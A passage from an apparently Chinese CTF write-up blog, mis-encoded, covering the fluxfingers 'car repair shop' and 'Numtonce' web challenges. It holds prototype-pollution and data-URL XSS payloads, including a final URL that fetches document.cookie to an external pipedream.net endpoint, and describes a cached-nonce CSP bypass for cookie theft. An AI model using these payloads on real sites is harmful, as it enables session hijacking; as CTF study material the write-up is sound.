class="keyword">if</span> (urlRegx.test(src)) &#123;</span><br><span class="line">        <span class="keyword">let</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>)</span><br><span class="line">        s.src = src</span><br><span class="line">        $(<span class="string">'head'</span>).append(s)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="åœ¨è¿™ä¸ªå‡½æ•°ä¸­æˆ‘ä»¬çœ‹åˆ°å®ƒåˆ›å»ºäº†ä¸€ä¸ªscriptæ ‡ç­¾å¹¶ä¸”è®¾ç½®å®ƒçš„srcå±æ€§ä¸ºurlæä¾›ä½œä¸ºå‚æ•°ä¼ å…¥å‡½æ•°çš„ã€‚"><a href="#åœ¨è¿™ä¸ªå‡½æ•°ä¸­æˆ‘ä»¬çœ‹åˆ°å®ƒåˆ›å»ºäº†ä¸€ä¸ªscriptæ ‡ç­¾å¹¶ä¸”è®¾ç½®å®ƒçš„srcå±æ€§ä¸ºurlæä¾›ä½œä¸ºå‚æ•°ä¼ å…¥å‡½æ•°çš„ã€‚" class="headerlink" title="åœ¨è¿™ä¸ªå‡½æ•°ä¸­æˆ‘ä»¬çœ‹åˆ°å®ƒåˆ›å»ºäº†ä¸€ä¸ªscriptæ ‡ç­¾å¹¶ä¸”è®¾ç½®å®ƒçš„srcå±æ€§ä¸ºurlæä¾›ä½œä¸ºå‚æ•°ä¼ å…¥å‡½æ•°çš„ã€‚"></a>åœ¨è¿™ä¸ªå‡½æ•°ä¸­æˆ‘ä»¬çœ‹åˆ°å®ƒåˆ›å»ºäº†ä¸€ä¸ªscriptæ ‡ç­¾å¹¶ä¸”è®¾ç½®å®ƒçš„<code>src</code>å±æ€§ä¸ºurlæä¾›ä½œä¸ºå‚æ•°ä¼ å…¥å‡½æ•°çš„ã€‚</h5><h5 id="ä½¿ç”¨helpå‚æ•°æ¥æ§åˆ¶ä¼ å…¥ä¸Šé¢å‡½æ•°çš„å‚æ•°ã€‚"><a href="#ä½¿ç”¨helpå‚æ•°æ¥æ§åˆ¶ä¼ å…¥ä¸Šé¢å‡½æ•°çš„å‚æ•°ã€‚" class="headerlink" title="ä½¿ç”¨helpå‚æ•°æ¥æ§åˆ¶ä¼ å…¥ä¸Šé¢å‡½æ•°çš„å‚æ•°ã€‚"></a>ä½¿ç”¨<code>help</code>å‚æ•°æ¥æ§åˆ¶ä¼ å…¥ä¸Šé¢å‡½æ•°çš„å‚æ•°ã€‚</h5><h5 id="æ¥ä¸‹æ¥æˆ‘ä»¬è¦é¢ä¸´çš„æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œä»–çœ‹èµ·æ¥éå¸¸ä¸¥æ ¼ã€‚"><a href="#æ¥ä¸‹æ¥æˆ‘ä»¬è¦é¢ä¸´çš„æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œä»–çœ‹èµ·æ¥éå¸¸ä¸¥æ ¼ã€‚" class="headerlink" title="æ¥ä¸‹æ¥æˆ‘ä»¬è¦é¢ä¸´çš„æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œä»–çœ‹èµ·æ¥éå¸¸ä¸¥æ ¼ã€‚"></a>æ¥ä¸‹æ¥æˆ‘ä»¬è¦é¢ä¸´çš„æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œä»–çœ‹èµ·æ¥éå¸¸ä¸¥æ ¼ã€‚</h5><h5 id="URLçš„æœ€åä¸€éƒ¨åˆ†-æ–‡ä»¶å-åªèƒ½ä½¿ç”¨ä»»æ„çš„å­—ç¬¦ã€‚"><a href="#URLçš„æœ€åä¸€éƒ¨åˆ†-æ–‡ä»¶å-åªèƒ½ä½¿ç”¨ä»»æ„çš„å­—ç¬¦ã€‚" class="headerlink" title="URLçš„æœ€åä¸€éƒ¨åˆ†(æ–‡ä»¶å)åªèƒ½ä½¿ç”¨ä»»æ„çš„å­—ç¬¦ã€‚"></a>URLçš„æœ€åä¸€éƒ¨åˆ†(æ–‡ä»¶å)åªèƒ½ä½¿ç”¨ä»»æ„çš„å­—ç¬¦ã€‚</h5><h5 id="ç»è¿‡ä¸€äº›æµ‹è¯•ï¼Œæˆ‘å‘ç°data-URLå°†ä¸regexåŒ¹é…data-lt-MIME-Type-gt-charset-lt-Charset-gt-base64-lt-Data-gt"><a href="#ç»è¿‡ä¸€äº›æµ‹è¯•ï¼Œæˆ‘å‘ç°data-URLå°†ä¸regexåŒ¹é…data-lt-MIME-Type-gt-charset-lt-Charset-gt-base64-lt-Data-gt" class="headerlink" title="ç»è¿‡ä¸€äº›æµ‹è¯•ï¼Œæˆ‘å‘ç°data-URLå°†ä¸regexåŒ¹é…data:[&lt;MIME-Type&gt;][;charset=&lt;Charset&gt;][;base64],&lt;Data&gt;"></a>ç»è¿‡ä¸€äº›æµ‹è¯•ï¼Œæˆ‘å‘ç°data-URLå°†ä¸regexåŒ¹é…<code>data:[&lt;MIME-Type&gt;][;charset=&lt;Charset&gt;][;base64],&lt;Data&gt;</code></h5><h5 id="å¦‚æœå®ƒä¼šåŠ è½½æŸç§åƒåœ¾å†…å®¹ç±»å‹ï¼Œåˆ™åªæœ‰ä¸ç¡®å®šæ€§ï¼Œå› ä¸ºæ‰€éœ€çš„-fluxfingers-netä¸»æœºåå°†è¢«æ”¾ç½®ã€‚"><a href="#å¦‚æœå®ƒä¼šåŠ è½½æŸç§åƒåœ¾å†…å®¹ç±»å‹ï¼Œåˆ™åªæœ‰ä¸ç¡®å®šæ€§ï¼Œå› ä¸ºæ‰€éœ€çš„-fluxfingers-netä¸»æœºåå°†è¢«æ”¾ç½®ã€‚" class="headerlink" title="å¦‚æœå®ƒä¼šåŠ è½½æŸç§åƒåœ¾å†…å®¹ç±»å‹ï¼Œåˆ™åªæœ‰ä¸ç¡®å®šæ€§ï¼Œå› ä¸ºæ‰€éœ€çš„*.fluxfingers.netä¸»æœºåå°†è¢«æ”¾ç½®ã€‚"></a>å¦‚æœå®ƒä¼šåŠ è½½æŸç§åƒåœ¾å†…å®¹ç±»å‹ï¼Œåˆ™åªæœ‰ä¸ç¡®å®šæ€§ï¼Œå› ä¸ºæ‰€éœ€çš„<code>*.fluxfingers.net</code>ä¸»æœºåå°†è¢«æ”¾ç½®ã€‚</h5><h5 id="ä»¤äººæƒŠè®¶çš„æ˜¯ä»–æ‰§è¡Œäº†ï¼Œå¹¶ä¸”å¼¹å‡ºäº†ä¸€ä¸ªalert-å¹¶ä¸”helpè®¾ç½®å¦‚ä¸‹ï¼š"><a href="#ä»¤äººæƒŠè®¶çš„æ˜¯ä»–æ‰§è¡Œäº†ï¼Œå¹¶ä¸”å¼¹å‡ºäº†ä¸€ä¸ªalert-å¹¶ä¸”helpè®¾ç½®å¦‚ä¸‹ï¼š" class="headerlink" title="ä»¤äººæƒŠè®¶çš„æ˜¯ä»–æ‰§è¡Œäº†ï¼Œå¹¶ä¸”å¼¹å‡ºäº†ä¸€ä¸ªalert()å¹¶ä¸”helpè®¾ç½®å¦‚ä¸‹ï¼š"></a>ä»¤äººæƒŠè®¶çš„æ˜¯ä»–æ‰§è¡Œäº†ï¼Œå¹¶ä¸”å¼¹å‡ºäº†ä¸€ä¸ª<code>alert()</code>å¹¶ä¸”<code>help</code>è®¾ç½®å¦‚ä¸‹ï¼š</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/text/javascript,alert(1)//.js</span><br></pre></td></tr></table></figure>

<h5 id="æ›´æ–°çš„payload"><a href="#æ›´æ–°çš„payload" class="headerlink" title="æ›´æ–°çš„payload:"></a>æ›´æ–°çš„payload:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair=&#123;%22key%22:%22%F0%9F%94%91%22,%22__proto__%22:%20&#123;%22__proto__%22:%20[%22lol%22],%20%22dotAll%22:true&#125;&#125;&amp;help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/text/javascript,alert(1)//.js#BugattiPorsche</span><br></pre></td></tr></table></figure>

<h5 id="ç°åœ¨æˆ‘ä»¬æœ‰äº†å®Œæ•´çš„åˆ©ç”¨é“¾ã€‚å”¯ä¸€ç¼ºå°‘çš„éƒ¨åˆ†å°±æ˜¯è¯»å–flag"><a href="#ç°åœ¨æˆ‘ä»¬æœ‰äº†å®Œæ•´çš„åˆ©ç”¨é“¾ã€‚å”¯ä¸€ç¼ºå°‘çš„éƒ¨åˆ†å°±æ˜¯è¯»å–flag" class="headerlink" title="ç°åœ¨æˆ‘ä»¬æœ‰äº†å®Œæ•´çš„åˆ©ç”¨é“¾ã€‚å”¯ä¸€ç¼ºå°‘çš„éƒ¨åˆ†å°±æ˜¯è¯»å–flag"></a>ç°åœ¨æˆ‘ä»¬æœ‰äº†å®Œæ•´çš„åˆ©ç”¨é“¾ã€‚å”¯ä¸€ç¼ºå°‘çš„éƒ¨åˆ†å°±æ˜¯è¯»å–flag</h5><h5 id="è§£å†³"><a href="#è§£å†³" class="headerlink" title="è§£å†³:"></a>è§£å†³:</h5><h6 id="æœ€ç»ˆçš„payloadï¼ŒæˆåŠŸè¯»å–åˆ°flagï¼Œå¦‚ä¸‹å›¾ï¼š"><a href="#æœ€ç»ˆçš„payloadï¼ŒæˆåŠŸè¯»å–åˆ°flagï¼Œå¦‚ä¸‹å›¾ï¼š" class="headerlink" title="æœ€ç»ˆçš„payloadï¼ŒæˆåŠŸè¯»å–åˆ°flagï¼Œå¦‚ä¸‹å›¾ï¼š"></a>æœ€ç»ˆçš„payloadï¼ŒæˆåŠŸè¯»å–åˆ°flagï¼Œå¦‚ä¸‹å›¾ï¼š</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair=&#123;%22key%22:%22%F0%9F%94%91%22,%22__proto__%22:%20&#123;%22__proto__%22:%20[%22lol%22],%20%22dotAll%22:true&#125;&#125;&amp;help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/text/javascript,fetch(%22https://en7f8h9cynsmk.x.pipedream.net/%22%2Bdocument.cookie)//.js#BugattiPorsche</span><br></pre></td></tr></table></figure>

<h5 id="å®ƒæå–cookieå¹¶å°†å…¶ä½œä¸ºURLçš„ä¸€éƒ¨åˆ†å‘é€fetchç»™æˆ‘ä»¬æ§åˆ¶çš„HTTPç«¯ç‚¹ã€‚RequestBin-comå’Œç±»ä¼¼çš„ç½‘ç«™å¯¹æ­¤éå¸¸æœ‰ç”¨ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥æ£€æŸ¥è¯·æ±‚ï¼Œå¹¶æŸ¥çœ‹æœ‰æ•ˆè´Ÿè½½URLçš„è®¿é—®è€…å°†å‘é€ä»€ä¹ˆã€‚"><a href="#å®ƒæå–cookieå¹¶å°†å…¶ä½œä¸ºURLçš„ä¸€éƒ¨åˆ†å‘é€fetchç»™æˆ‘ä»¬æ§åˆ¶çš„HTTPç«¯ç‚¹ã€‚RequestBin-comå’Œç±»ä¼¼çš„ç½‘ç«™å¯¹æ­¤éå¸¸æœ‰ç”¨ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥æ£€æŸ¥è¯·æ±‚ï¼Œå¹¶æŸ¥çœ‹æœ‰æ•ˆè´Ÿè½½URLçš„è®¿é—®è€…å°†å‘é€ä»€ä¹ˆã€‚" class="headerlink" title="å®ƒæå–cookieå¹¶å°†å…¶ä½œä¸ºURLçš„ä¸€éƒ¨åˆ†å‘é€fetchç»™æˆ‘ä»¬æ§åˆ¶çš„HTTPç«¯ç‚¹ã€‚RequestBin.comå’Œç±»ä¼¼çš„ç½‘ç«™å¯¹æ­¤éå¸¸æœ‰ç”¨ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥æ£€æŸ¥è¯·æ±‚ï¼Œå¹¶æŸ¥çœ‹æœ‰æ•ˆè´Ÿè½½URLçš„è®¿é—®è€…å°†å‘é€ä»€ä¹ˆã€‚"></a>å®ƒæå–cookieå¹¶å°†å…¶ä½œä¸ºURLçš„ä¸€éƒ¨åˆ†å‘é€fetchç»™æˆ‘ä»¬æ§åˆ¶çš„HTTPç«¯ç‚¹ã€‚RequestBin.comå’Œç±»ä¼¼çš„ç½‘ç«™å¯¹æ­¤éå¸¸æœ‰ç”¨ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥æ£€æŸ¥è¯·æ±‚ï¼Œå¹¶æŸ¥çœ‹æœ‰æ•ˆè´Ÿè½½URLçš„è®¿é—®è€…å°†å‘é€ä»€ä¹ˆã€‚</h5><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/flag-requestbin.png" alt></p>
<h5 id="æœ€åæˆ‘ä»¬å¾—åˆ°äº†æ­£ç¡®çš„flagï¼š-flag-brumm-brumm-brumm-brumm-brumm-brumm-brumm"><a href="#æœ€åæˆ‘ä»¬å¾—åˆ°äº†æ­£ç¡®çš„flagï¼š-flag-brumm-brumm-brumm-brumm-brumm-brumm-brumm" class="headerlink" title="æœ€åæˆ‘ä»¬å¾—åˆ°äº†æ­£ç¡®çš„flagï¼š flag{brumm_brumm_brumm_brumm_brumm_brumm_brumm}"></a>æœ€åæˆ‘ä»¬å¾—åˆ°äº†æ­£ç¡®çš„flagï¼š flag{brumm_brumm_brumm_brumm_brumm_brumm_brumm}</h5><h4 id="Numtonce"><a href="#Numtonce" class="headerlink" title="Numtonce"></a>Numtonce</h4><h5 id="é¢˜ç›®çš„åœ°å€-https-fluxfingersforfuture-fluxfingers-net-challenges-29"><a href="#é¢˜ç›®çš„åœ°å€-https-fluxfingersforfuture-fluxfingers-net-challenges-29" class="headerlink" title="é¢˜ç›®çš„åœ°å€:https://fluxfingersforfuture.fluxfingers.net/challenges/29"></a>é¢˜ç›®çš„åœ°å€:<a href="https://fluxfingersforfuture.fluxfingers.net/challenges/29" target="_blank" rel="noopener">https://fluxfingersforfuture.fluxfingers.net/challenges/29</a></h5><h5 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><h6 id="é¢å¯¹ä¸–ç•Œä¸Šæ‰€æœ‰çš„åæ¶ˆæ¯ï¼Œæ¯ä¸ªäººéƒ½éœ€è¦ä¸€ä¸ªå®‰é™çš„åœ°æ–¹æ¥æ”¾æ¾å¿ƒæƒ…ã€‚"><a href="#é¢å¯¹ä¸–ç•Œä¸Šæ‰€æœ‰çš„åæ¶ˆæ¯ï¼Œæ¯ä¸ªäººéƒ½éœ€è¦ä¸€ä¸ªå®‰é™çš„åœ°æ–¹æ¥æ”¾æ¾å¿ƒæƒ…ã€‚" class="headerlink" title="é¢å¯¹ä¸–ç•Œä¸Šæ‰€æœ‰çš„åæ¶ˆæ¯ï¼Œæ¯ä¸ªäººéƒ½éœ€è¦ä¸€ä¸ªå®‰é™çš„åœ°æ–¹æ¥æ”¾æ¾å¿ƒæƒ…ã€‚"></a>é¢å¯¹ä¸–ç•Œä¸Šæ‰€æœ‰çš„åæ¶ˆæ¯ï¼Œæ¯ä¸ªäººéƒ½éœ€è¦ä¸€ä¸ªå®‰é™çš„åœ°æ–¹æ¥æ”¾æ¾å¿ƒæƒ…ã€‚</h6><h6 id="æˆ‘ä»¬å»ºç«‹äº†ä¸€ä¸ª-ä½†æ˜¯ä½ å¿…é¡»æ¥å¸®åŠ©æˆ‘ä»¬ä¿è¯å®ƒå®‰å…¨ã€‚å¦‚æœä½ å‘ç°ä¸€ä¸ªå±é™©ï¼Œå‘Šè¯‰è¿™ä¸ªæ£®æ—å®ˆæŠ¤è€…ï¼Œå®ƒå°†æŠŠcookieå‘é€ç»™ä½ ã€‚"><a href="#æˆ‘ä»¬å»ºç«‹äº†ä¸€ä¸ª-ä½†æ˜¯ä½ å¿…é¡»æ¥å¸®åŠ©æˆ‘ä»¬ä¿è¯å®ƒå®‰å…¨ã€‚å¦‚æœä½ å‘ç°ä¸€ä¸ªå±é™©ï¼Œå‘Šè¯‰è¿™ä¸ªæ£®æ—å®ˆæŠ¤è€…ï¼Œå®ƒå°†æŠŠcookieå‘é€ç»™ä½ ã€‚" class="headerlink" title="æˆ‘ä»¬å»ºç«‹äº†ä¸€ä¸ª,ä½†æ˜¯ä½ å¿…é¡»æ¥å¸®åŠ©æˆ‘ä»¬ä¿è¯å®ƒå®‰å…¨ã€‚å¦‚æœä½ å‘ç°ä¸€ä¸ªå±é™©ï¼Œå‘Šè¯‰è¿™ä¸ªæ£®æ—å®ˆæŠ¤è€…ï¼Œå®ƒå°†æŠŠcookieå‘é€ç»™ä½ ã€‚"></a><a href="https://numtonce.fluxfingersforfuture.fluxfingers.net/" target="_blank" rel="noopener">æˆ‘ä»¬å»ºç«‹äº†ä¸€ä¸ª</a>,ä½†æ˜¯ä½ å¿…é¡»æ¥å¸®åŠ©æˆ‘ä»¬ä¿è¯å®ƒå®‰å…¨ã€‚å¦‚æœä½ å‘ç°ä¸€ä¸ªå±é™©ï¼Œ<a href="https://numtonce.fluxfingersforfuture.fluxfingers.net/submit/" target="_blank" rel="noopener">å‘Šè¯‰è¿™ä¸ªæ£®æ—å®ˆæŠ¤è€…</a>ï¼Œå®ƒå°†æŠŠcookieå‘é€ç»™ä½ ã€‚</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/website.png" alt></p>
<h5 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h5><h6 id="å¯ä»¥é€šè¿‡URLå“ˆå¸Œå®ç°XSSã€‚ä½†æ˜¯å·²ç»è®¾ç½®CSPï¼Œå› æ­¤ä¸å…è®¸ä½¿ç”¨å¤–éƒ¨è„šæœ¬ã€‚"><a href="#å¯ä»¥é€šè¿‡URLå“ˆå¸Œå®ç°XSSã€‚ä½†æ˜¯å·²ç»è®¾ç½®CSPï¼Œå› æ­¤ä¸å…è®¸ä½¿ç”¨å¤–éƒ¨è„šæœ¬ã€‚" class="headerlink" title="å¯ä»¥é€šè¿‡URLå“ˆå¸Œå®ç°XSSã€‚ä½†æ˜¯å·²ç»è®¾ç½®CSPï¼Œå› æ­¤ä¸å…è®¸ä½¿ç”¨å¤–éƒ¨è„šæœ¬ã€‚"></a>å¯ä»¥é€šè¿‡URLå“ˆå¸Œå®ç°XSSã€‚ä½†æ˜¯å·²ç»è®¾ç½®CSPï¼Œå› æ­¤ä¸å…è®¸ä½¿ç”¨å¤–éƒ¨è„šæœ¬ã€‚</h6><h6 id="é™¤ééšæœºæ•°-nonce-æ ‡ç­¾æ˜¯æ­£ç¡®çš„ã€‚æƒ³æ³•æ˜¯é€šè¿‡ä»ç¼“å­˜ä¸­åŠ è½½ç½‘ç«™æ¥å¼ºåˆ¶åˆ·æ–°åä½¿nonceæ ‡ç­¾æ¥ä¿æŒç›¸åŒã€‚"><a href="#é™¤ééšæœºæ•°-nonce-æ ‡ç­¾æ˜¯æ­£ç¡®çš„ã€‚æƒ³æ³•æ˜¯é€šè¿‡ä»ç¼“å­˜ä¸­åŠ è½½ç½‘ç«™æ¥å¼ºåˆ¶åˆ·æ–°åä½¿nonceæ ‡ç­¾æ¥ä¿æŒç›¸åŒã€‚" class="headerlink" title="é™¤ééšæœºæ•°(nonce)æ ‡ç­¾æ˜¯æ­£ç¡®çš„ã€‚æƒ³æ³•æ˜¯é€šè¿‡ä»ç¼“å­˜ä¸­åŠ è½½ç½‘ç«™æ¥å¼ºåˆ¶åˆ·æ–°åä½¿nonceæ ‡ç­¾æ¥ä¿æŒç›¸åŒã€‚"></a>é™¤ééšæœºæ•°(nonce)æ ‡ç­¾æ˜¯æ­£ç¡®çš„ã€‚æƒ³æ³•æ˜¯é€šè¿‡ä»ç¼“å­˜ä¸­åŠ è½½ç½‘ç«™æ¥å¼ºåˆ¶åˆ·æ–°åä½¿nonceæ ‡ç­¾æ¥ä¿æŒç›¸åŒã€‚</h6><h6 id="js-css-imageæ–‡ä»¶æ˜¯ä»ç¼“å­˜ä¸­åŠ è½½çš„ï¼Œä½†æ˜¯è¿™ä¸ªindex-phpæ–‡ä»¶ä¸æ˜¯ã€‚"><a href="#js-css-imageæ–‡ä»¶æ˜¯ä»ç¼“å­˜ä¸­åŠ è½½çš„ï¼Œä½†æ˜¯è¿™ä¸ªindex-phpæ–‡ä»¶ä¸æ˜¯ã€‚" class="headerlink" title="js/css/imageæ–‡ä»¶æ˜¯ä»ç¼“å­˜ä¸­åŠ è½½çš„ï¼Œä½†æ˜¯è¿™ä¸ªindex.phpæ–‡ä»¶ä¸æ˜¯ã€‚"></a>js/css/imageæ–‡ä»¶æ˜¯ä»ç¼“å­˜ä¸­åŠ è½½çš„ï¼Œä½†æ˜¯è¿™ä¸ªindex.phpæ–‡ä»¶ä¸æ˜¯ã€‚</h6><h6 id="ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åœ¨urlçš„åé¢é™„åŠ ä¸€ä¸ªcssæ–‡ä»¶æ¥ä»ç¼“å­˜ä¸­å¼ºåˆ¶åŠ è½½index-phpæ–‡ä»¶"><a href="#ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åœ¨urlçš„åé¢é™„åŠ ä¸€ä¸ªcssæ–‡ä»¶æ¥ä»ç¼“å­˜ä¸­å¼ºåˆ¶åŠ è½½index-phpæ–‡ä»¶" class="headerlink" title="ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åœ¨urlçš„åé¢é™„åŠ ä¸€ä¸ªcssæ–‡ä»¶æ¥ä»ç¼“å­˜ä¸­å¼ºåˆ¶åŠ è½½index.phpæ–‡ä»¶"></a>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åœ¨<code>url</code>çš„åé¢é™„åŠ ä¸€ä¸ª<code>css</code>æ–‡ä»¶æ¥ä»ç¼“å­˜ä¸­å¼ºåˆ¶åŠ è½½<code>index.php</code>æ–‡ä»¶</h6><h6 id="ä¾‹å¦‚ä¸‹é¢çš„é“¾æ¥http-url-com-index-php-blub-cssã€‚"><a href="#ä¾‹å¦‚ä¸‹é¢çš„é“¾æ¥http-url-com-index-php-blub-cssã€‚" class="headerlink" title="ä¾‹å¦‚ä¸‹é¢çš„é“¾æ¥http://url.com/index.php/blub.cssã€‚"></a>ä¾‹å¦‚ä¸‹é¢çš„é“¾æ¥<a href="http://url.com/index.php/blub.css" target="_blank" rel="noopener">http://url.com/index.php/blub.css</a>ã€‚</h6><h6 id="index-phpå°†ä¼šåŠ è½½ï¼Œç„¶åè¿™ä¸ªä»£ç†æœåŠ¡å™¨å°†ä»–ä½œä¸ºä¸€ä¸ªcssæ–‡ä»¶å¹¶ä¸”åŠ è½½index-phpæ–‡ä»¶çš„ç¼“å­˜ç‰ˆæœ¬ã€‚"><a href="#index-phpå°†ä¼šåŠ è½½ï¼Œç„¶åè¿™ä¸ªä»£ç†æœåŠ¡å™¨å°†ä»–ä½œä¸ºä¸€ä¸ªcssæ–‡ä»¶å¹¶ä¸”åŠ è½½index-phpæ–‡ä»¶çš„ç¼“å­˜ç‰ˆæœ¬ã€‚" class="headerlink" title="index.phpå°†ä¼šåŠ è½½ï¼Œç„¶åè¿™ä¸ªä»£ç†æœåŠ¡å™¨å°†ä»–ä½œä¸ºä¸€ä¸ªcssæ–‡ä»¶å¹¶ä¸”åŠ è½½index.phpæ–‡ä»¶çš„ç¼“å­˜ç‰ˆæœ¬ã€‚"></a><code>index.php</code>å°†ä¼šåŠ è½½ï¼Œç„¶åè¿™ä¸ªä»£ç†æœåŠ¡å™¨å°†ä»–ä½œä¸ºä¸€ä¸ªcssæ–‡ä»¶å¹¶ä¸”åŠ è½½<code>index.php</code>æ–‡ä»¶çš„ç¼“å­˜ç‰ˆæœ¬ã€‚</h6><h6 id="å› æ­¤ç°åœ¨æˆ‘ä»¬æå‰çŸ¥é“äº†éšæœºæ•°-nonce-ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„è‡ªå®šä¹‰jsä»£ç ã€‚"><a href="#å› æ­¤ç°åœ¨æˆ‘ä»¬æå‰çŸ¥é“äº†éšæœºæ•°-nonce-ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„è‡ªå®šä¹‰jsä»£ç ã€‚" class="headerlink" title="å› æ­¤ç°åœ¨æˆ‘ä»¬æå‰çŸ¥é“äº†éšæœºæ•°(nonce)ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„è‡ªå®šä¹‰jsä»£ç ã€‚"></a>å› æ­¤ç°åœ¨æˆ‘ä»¬æå‰çŸ¥é“äº†éšæœºæ•°(nonce)ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„è‡ªå®šä¹‰<code>js</code>ä»£ç ã€‚</h6><h5 id="å®Œå–„payloadï¼š"><a href="#å®Œå–„payloadï¼š" class="headerlink" title="å®Œå–„payloadï¼š"></a>å®Œå–„payloadï¼š</h5><h6 id="é€šè¿‡é˜…è¯»ä¸Šé¢çš„æè¿°ï¼Œæˆ‘ä»¬çš„ç›®æ ‡ä¼¼ä¹æ˜¯å»ç›—çªƒè¿™ä¸ªcookieä»æµè§ˆå™¨ã€‚"><a href="#é€šè¿‡é˜…è¯»ä¸Šé¢çš„æè¿°ï¼Œæˆ‘ä»¬çš„ç›®æ ‡ä¼¼ä¹æ˜¯å»ç›—çªƒè¿™ä¸ªcookieä»æµè§ˆå™¨ã€‚" class="headerlink" title="é€šè¿‡é˜…è¯»ä¸Šé¢çš„æè¿°ï¼Œæˆ‘ä»¬çš„ç›®æ ‡ä¼¼ä¹æ˜¯å»ç›—çªƒè¿™ä¸ªcookieä»æµè§ˆå™¨ã€‚"></a>é€šè¿‡é˜…è¯»ä¸Šé¢çš„æè¿°ï¼Œæˆ‘ä»¬çš„ç›®æ ‡ä¼¼ä¹æ˜¯å»ç›—çªƒè¿™ä¸ªcookieä»æµè§ˆå™¨ã€‚</h6><h6 id="é€šå¸¸ï¼Œè¿™æ˜¯é€šè¿‡å°†è‡ªå®šä¹‰çš„javascriptä»£ç æ³¨å…¥ç½‘ç«™-xss-å¹¶ä¸”é€šè¿‡ä¸€æ®µä»£ç å°†Cookieå‘é€åˆ°æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨æ¥å®Œæˆçš„ã€‚"><a href="#é€šå¸¸ï¼Œè¿™æ˜¯é€šè¿‡å°†è‡ªå®šä¹‰çš„javascriptä»£ç æ³¨å…¥ç½‘ç«™-xss-å¹¶ä¸”é€šè¿‡ä¸€æ®µä»£ç å°†Cookieå‘é€åˆ°æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨æ¥å®Œæˆçš„ã€‚" class="headerlink" title="é€šå¸¸ï¼Œè¿™æ˜¯é€šè¿‡å°†è‡ªå®šä¹‰çš„javascriptä»£ç æ³¨å…¥ç½‘ç«™(xss)å¹¶ä¸”é€šè¿‡ä¸€æ®µä»£ç å°†Cookieå‘é€åˆ°æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨æ¥å®Œæˆçš„ã€‚"></a>é€šå¸¸ï¼Œè¿™æ˜¯é€šè¿‡å°†è‡ªå®šä¹‰çš„javascriptä»£ç æ³¨å…¥ç½‘ç«™(xss)å¹¶ä¸”é€šè¿‡ä¸€æ®µä»£ç å°†Cookieå‘é€åˆ°æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨æ¥å®Œæˆçš„ã€‚</h6><h6 id="æ£®æ—å®ˆæŠ¤è€…ç½‘ç«™ä¹Ÿä»…ä»…æ˜¯ä¸€ä¸ªæ–‡æœ¬å­—æ®µï¼Œç”¨äºä»£æ›¿URLã€‚"><a href="#æ£®æ—å®ˆæŠ¤è€…ç½‘ç«™ä¹Ÿä»…ä»…æ˜¯ä¸€ä¸ªæ–‡æœ¬å­—æ®µï¼Œç”¨äºä»£æ›¿URLã€‚" class="headerlink" title="æ£®æ—å®ˆæŠ¤è€…ç½‘ç«™ä¹Ÿä»…ä»…æ˜¯ä¸€ä¸ªæ–‡æœ¬å­—æ®µï¼Œç”¨äºä»£æ›¿URLã€‚"></a>æ£®æ—å®ˆæŠ¤è€…ç½‘ç«™ä¹Ÿä»…ä»…æ˜¯ä¸€ä¸ªæ–‡æœ¬å­—æ®µï¼Œç”¨äºä»£æ›¿URLã€‚</h6><h6 id="ç„¶åxss-botå°†ä¼šå¸¦ç€cookieè®¿é—®è¿™äº›URLï¼Œè€Œé‚£ä¸ªflagå°±åœ¨cookieé‡Œé¢ã€‚"><a href="#ç„¶åxss-botå°†ä¼šå¸¦ç€cookieè®¿é—®è¿™äº›URLï¼Œè€Œé‚£ä¸ªflagå°±åœ¨cookieé‡Œé¢ã€‚" class="headerlink" title="ç„¶åxss botå°†ä¼šå¸¦ç€cookieè®¿é—®è¿™äº›URLï¼Œè€Œé‚£ä¸ªflagå°±åœ¨cookieé‡Œé¢ã€‚"></a>ç„¶åxss botå°†ä¼šå¸¦ç€cookieè®¿é—®è¿™äº›URLï¼Œè€Œé‚£ä¸ªflagå°±åœ¨cookieé‡Œé¢ã€‚</h6><h6 id="ç°åœ¨æˆ‘ä»¬å¼€å§‹æ„é€ pocå»æ”»å‡»ã€‚"><a href="#ç°åœ¨æˆ‘ä»¬å¼€å§‹æ„é€ pocå»æ”»å‡»ã€‚" 